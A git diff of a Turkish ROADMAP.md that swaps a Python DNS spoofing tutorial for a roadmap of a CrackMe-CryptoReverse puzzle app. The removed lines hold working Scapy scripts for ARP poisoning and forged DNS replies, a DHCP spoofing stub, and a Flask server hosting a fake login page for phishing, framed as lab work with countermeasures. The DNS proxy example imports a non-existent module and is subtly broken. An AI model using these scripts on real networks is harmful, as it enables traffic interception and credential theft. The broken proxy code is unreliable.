@@ -1,172 +1,93 @@
-# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
+# ROADMAP.md: CrackMe-CryptoReverse Uygulamasının Gelişim Yolculuğu
 
-## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
+## GİRİŞ
+Bu yol haritası, CrackMe-CryptoReverse uygulamasının mevcut durumunu ve gelecekteki gelişim aşamalarını detaylandırır. Proje, kullanıcıların çeşitli kriptografik bulmacaları ve kod gizleme tekniklerini, tersine mühendislik araçlarını kullanarak çözme becerilerini geliştirmeyi amaçlamaktadır. Her yeni seviye, siber güvenlik meraklılarına daha derinlemesine bir meydan okuma sunacak ve farklı analiz yöntemlerini keşfetme fırsatı tanıyacaktır.
 
-Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
+ **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
 
-## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
-- **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+ 
+🎯 ## PROJE VİZYONU / Project Vision
+CrackMe-CryptoReverse'in nihai hedefi, tersine mühendislik ve kriptografi alanında yeni başlayanlardan ileri seviye kullanıcılara kadar herkes için kapsamlı, etkileşimli ve ilham verici bir öğrenme platformu olmaktır. Uygulamanın temel amacı, kullanıcıları problem çözme, analitik düşünme ve siber güvenlik araçlarını etkin kullanma konularında teşvik etmektir.
 
-## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+## ÖN KOŞULLAR
 
-## Temel Bileşenlerin Geliştirilmesi
+**Python 3.x**: Uygulamanın temel geliştirme dili.
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
+**KÜTÜPHANELER**:
+**tkinter**: Grafik kullanıcı arayüzü (GUI) için.
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
+**hashlib**: Şifreleme algoritmaları için (örneğin MD5).
+Diğer standart Python kütüphaneleri.
 
-```python
-from scapy.all import *
-import time
+**BİLGİ GEREKSİNİMLERİ (Kullanıcılar İçin)**:
+Python programlama temelleri (opsiyonel, ancak kod analizi için faydalı).
+Temel kriptografi (Sezar, XOR, Hashing) bilgisi.
+Tersine mühendislik kavramlarına aşinalık (statik/dinamik analiz).
+Önerilen Araçlar (Şifre Çözmek İçin):
+strings (komut satırı aracı)
+Ghidra (disassembler/decompiler)
+IDA Free (disassembler)
+x64dbg (debugger)
+Online kriptografi çözücüler (örneğin XOR, Sezar)
+Hex editörler
 
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
 
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
+✅ ## MEVCUT SEVİYELER VE HEDEFLER (v1.0) / Current Levels & Objectives
+Uygulamanın mevcut sürümünde (v1.0) bulunan seviyeler ve her birindeki temel tersine mühendislik hedefleri:
 
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
-```
+**Seviye 1**: Ters Çevirme (Reverse String)
+**Hedef**: Basit string manipülasyonunu tanıma ve Python kodundaki string operasyonlarını fark etme.
 
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
+**Seviye 2**: XOR Şifrelemesi (XOR Encryption)
+**Hedef**: XOR işleminin temel kriptografik kullanımını anlama. İkili dosyada anahtarı veya XOR'lanmış değeri bulma ve manuel olarak çözme.
 
-1. Scapy ile DNS spoofing betiğini yazın:
+**Seviye 3**: Sezar Şifrelemesi (Caesar Cipher)
+**Hedef**: Klasik şifreleme algoritmalarından birini çözme. Sabit kaydırma miktarını (shift) tespit etme ve metni deşifre etme.
 
-```python
-from scapy.all import *
+**Seviye 4**: MD5 Hash Kısmi Parçası (Partial MD5 Hash)
+**Hedef**: Hashing algoritmalarının tek yönlü doğasını anlama. Belirli bir hash parçasını karşılayacak orijinal metni bulmak için deneme-yanılma veya bilinen stringlerin hash'ini kontrol etme.
 
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
+**Seviye 5**: Matematiksel Hesaplama (Mathematical Calculation)
+Hedef: Programın içerisinde basit matematiksel işlemlerin nasıl saklandığını veya yürütüldüğünü tespit etme ve sonucu hesaplama.
 
-sniff(filter="udp port 53", prn=dns_spoof)
-```
+**Seviye 6**: Karmaşık Kontrol Akışı (Obfuscated Control Flow)
+**Hedef**: Kod gizleme tekniklerine ilk bakış. Uygulamanın mantığını takip ederek veya hata ayıklayıcı kullanarak doğru değeri dinamik olarak bulma.
 
-### DHCP Manipülasyon Betiği
-Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).
 
-1. Scapy ile DHCP spoofing betiği:
+🗺️ ## YOL HARİTASI (Gelecek Geliştirmeler) / Roadmap (Future Developments)
+**Faz 1**: Kriptografik Zenginleştirme (Hedef: v1.1)
+Yeni Şifreleme Algoritmaları:
+**Base64/ROT13**: Daha sık karşılaşılan kodlama/basit şifreleme yöntemlerini ekleme.
+**Polyalphabetic Ciphers (Vigenere gibi)**: Daha karmaşık klasik şifreleme yöntemlerini dahil etme.
+**Basit Symmetric Key Crypto (AES/DES)**: Python'daki kütüphanelerle basit bir simetrik şifreleme seviyesi ekleme (anahtarın bulunması gereken).
+**Daha Kapsamlı Hash Fonksiyonları**: SHA-256, SHA-3 gibi farklı hash türlerini içeren seviyeler.
+Bitwise Operasyonlar: Şifrelemelerde sıkça kullanılan bitwise (AND, OR, NOT, Shift) operasyonlarını içeren seviyeler.
+**Faz 2**: Tersine Mühendislik Zorlukları (Hedef: v1.2)
+**Anti-Tampering Mekanizmaları**: Uygulamanın, değiştirilmeye çalışıldığında veya hata ayıklayıcıya bağlandığında davranışını değiştiren basit önlemler.
+**Anti-Debugging Teknikleri**: Uygulamanın bir debugger altında çalışıp çalışmadığını algılayan ve buna göre farklı bir yol izleyen seviyeler.
+**Dinamik Anahtar Üretimi**: Şifrenin veya anahtarın sabit olarak depolanmak yerine çalışma zamanında belirli koşullara göre üretildiği seviyeler.
+**Farklı Dosya Biçimleri**: Sadece string aramasıyla bulunamayacak, dosya formatı analizi gerektiren (örneğin gömülü resimlerde/dosyalarda gizli veri) seviyeler.
+**Faz 3**: Kullanıcı Deneyimi ve Araç Entegrasyonu (Hedef: v2.0)
+**Geliştirilmiş GUI**: Kullanıcı arayüzünü daha interaktif ve bilgilendirici hale getirme.
+**İlerleme Takibi**: Detaylı seviye tamamlama istatistikleri ve başarımlar.
+**Hata Ayıklama İpuçları**: Takılan kullanıcılar için isteğe bağlı olarak sunulabilecek seviyeye özel ipuçları (sadece ipucu butonuyla aktifleşen).
+**Test Otomasyonu**: Her seviyenin doğru çalışıp çalışmadığını kontrol etmek için otomatik testler geliştirme.
+**Daha İyi Cross-Platform Uyumluluğu**: MacOS ve Linux'ta da daha sorunsuz çalışmasını sağlama.
 
-```python
-from scapy.all import *
+📈## GELİŞTİRMELERİN TEST EDİLMESİ / Testing Developments
+Her yeni seviye ve özellik eklendiğinde, aşağıdaki test adımları uygulanacaktır:
 
-def dhcp_spoof(packet):
-    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
-        fake_dns = "192.168.1.100"
-        # Sahte DHCP yanıtı oluşturma (detaylı paket yapılandırması gerekir)
-        # send(dhcp_offer)
+**Manuel Testler**: Uygulama, her seviye için belirlenmiş doğru şifrelerle manuel olarak test edilecektir.
+**Tersine Mühendislik Testleri**:
+strings ile metin arama.
+Ghidra/IDA Free ile statik kod analizi yaparak fonksiyon akışlarını ve veri yapılarını inceleme.
+x64dbg gibi bir debugger ile dinamik analiz yaparak çalışma zamanı davranışını izleme.
+**Hata Yakalama**: Potansiyel hataları ve güvenlik açıklarını belirlemek için çeşitli yanlış girişler denenecektir.
 
-sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
-```
+🛡️ ## GÜVENLİK VE ETİK İLKELER / Security & Ethical Guidelines
+**Eğitim Amacı**: Projenin tek amacı, siber güvenlik becerilerini etik ve yasal sınırlar içinde geliştirmektir.
+**İzinli Kullanım**: Bu projede öğrenilen hiçbir teknik, yazılı izin alınmadan gerçek sistemlere veya ağlara karşı kullanılmamalıdır.
+**Sorumluluk**: Kullanıcılar, bu araçları ve bilgileri kullanırken kendi eylemlerinden tamamen sorumludur.
 
-### Sahte Web Sunucusu
-Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.
-
-1. Flask’ı kurun: `pip install flask`
-2. Basit bir Flask uygulaması yazın:
-
-```python
-from flask import Flask, render_template
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('fake_login.html')
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-```
-
-- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).
-
-## Gelişmiş Geliştirmeler
-
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
-
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
-
-```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
-
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
-
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
-```
-
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
-
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
-
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
-
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
-
-## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+🏁 ## SONUÇ/ Conclusion
+Bu yol haritası, CrackMe-CryptoReverse'in heyecan verici gelişim potansiyelini ortaya koymaktadır. Topluluktan gelecek geri bildirimler ve katkılarla projenin daha da zenginleşeceğine inanıyoruz. Siber güvenlik dünyasında yeteneklerinizi test etmek ve geliştirmek için bize katılın!
